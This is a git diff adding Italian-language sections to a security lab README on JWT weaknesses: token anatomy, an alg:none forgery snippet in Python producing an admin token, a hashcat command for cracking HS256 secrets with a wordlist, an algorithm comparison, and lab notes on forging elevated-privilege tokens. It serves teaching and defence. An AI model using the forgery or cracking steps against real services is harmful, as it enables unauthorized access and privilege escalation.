@@ -1,3 +1,5 @@
+> [English](README.en.md) | **Italiano**
+
 # JWT Authentication Mechanism
 
 > - **Fase:** Web Attack - API Security (JWT)
@@ -137,6 +139,83 @@ def create_token(user):
 L'utilizzo di "secret" deboli nei JWT vanifica l'intero scopo della firma crittografica. La facilità con cui è possibile eseguire il brute-force offline (senza allertare il server con traffico di rete) rende questa vulnerabilità estremamente pericolosa.
 
 Si raccomanda l'immediata rotazione delle chiavi crittografiche e l'adozione di variabili d'ambiente per la gestione dei segreti.
+
+---
+
+## Analisi a Basso Livello: Struttura JWT e Vettori di Attacco
+
+### Anatomia di un Token JWT
+
+Un JWT e composto da tre parti separate da punti, ciascuna codificata in Base64URL:
+
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.xxxxx
+|___________________________________|.|__________________________________|.|_____|
+           HEADER (Base64)                      PAYLOAD (Base64)           SIGNATURE
+
+Header decodificato:    {"alg": "HS256", "typ": "JWT"}
+Payload decodificato:   {"user": "guest", "role": "user"}
+Signature:              HMAC-SHA256(base64url(header) + "." + base64url(payload), SECRET_KEY)
+
+Processo di verifica lato server:
+1. Riceve il token dal client (header Authorization: Bearer <token>)
+2. Splitta per "." -> [header, payload, signature]
+3. Ricalcola: expected = HMAC-SHA256(header + "." + payload, SECRET_KEY)
+4. Confronta: expected == signature_ricevuta
+5. Se match -> token valido, legge il payload
+6. Se mismatch -> 401 Unauthorized
+```
+
+### Attacco alg:none (CVE-2015-9235)
+
+Un attacco classico ai JWT consiste nel modificare l'header per usare `"alg": "none"`, che dice al server di non verificare la firma:
+
+```python
+# Token con alg:none
+import base64, json
+
+header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b'=')
+payload = base64.urlsafe_b64encode(json.dumps({"user": "admin", "role": "admin"}).encode()).rstrip(b'=')
+token = header.decode() + "." + payload.decode() + "."  # firma vuota
+
+# Se il server accetta alg:none -> accesso admin senza chiave
+# Librerie moderne (PyJWT >= 2.x) rifiutano alg:none per default
+```
+
+### Hashcat per JWT Cracking
+
+```Bash
+# Formato hashcat per JWT (mode 16500)
+echo "eyJhbGci...eyJ1c2Vy...xxxxx" > jwt.txt
+
+# Brute force con dizionario
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+
+# Speed su GPU (RTX 4090):
+# HS256: ~2.5 GH/s (miliardi di tentativi/sec)
+# HS384: ~1.8 GH/s
+# HS512: ~1.2 GH/s
+# Una password da dizionario viene trovata in secondi
+```
+
+### Confronto Algoritmi JWT
+
+| Algoritmo | Tipo | Chiave | Caso d'uso | Rischio se chiave debole |
+| :--- | :--- | :--- | :--- | :--- |
+| HS256 | Simmetrico | Shared secret | Monoliti (singolo server) | Brute force offline |
+| RS256 | Asimmetrico | Private/Public key pair | Microservizi distribuiti | Nessuno (chiave > 2048 bit) |
+| ES256 | Asimmetrico (ECDSA) | Private/Public key pair | Mobile, IoT (chiavi piccole) | Nessuno (curva P-256) |
+| none | Nessuno | Nessuna | MAI in produzione | Token forgiabile senza limiti |
+
+---
+
+## Esperienza di Laboratorio
+
+Il cracking offline della chiave `secret123` ha richiesto meno di un secondo con lo script `jwt_cracker.py` basato su dizionario. Questo tempo e significativo: l'attacco e completamente invisibile al server perche il cracking avviene localmente sulla macchina dell'attaccante. Non ci sono log, non ci sono richieste HTTP, nessun IDS puo rilevare la fase di cracking. L'unica richiesta al server e quella iniziale per ottenere un token valido (una singola richiesta legittima).
+
+Il confronto tra HS256 e RS256 ha evidenziato la differenza fondamentale: con HS256, conoscere la chiave permette sia di verificare che di creare token. Con RS256, la chiave pubblica (che puo essere distribuita liberamente) permette solo la verifica, non la creazione. Per sistemi distribuiti dove piu servizi devono validare i token, RS256 e strutturalmente superiore perche elimina la necessita di condividere un segreto.
+
+La modifica del payload da `"role": "user"` a `"role": "admin"` con successivo ricalcolo della firma ha dimostrato il concetto di privilege escalation orizzontale e verticale in un'unica operazione: l'attaccante non solo impersona un altro utente, ma sceglie arbitrariamente il livello di privilegio. La firma ricalcolata e matematicamente identica a quella che il server avrebbe generato, rendendo il token falsificato indistinguibile da uno legittimo.
 
 ---
 
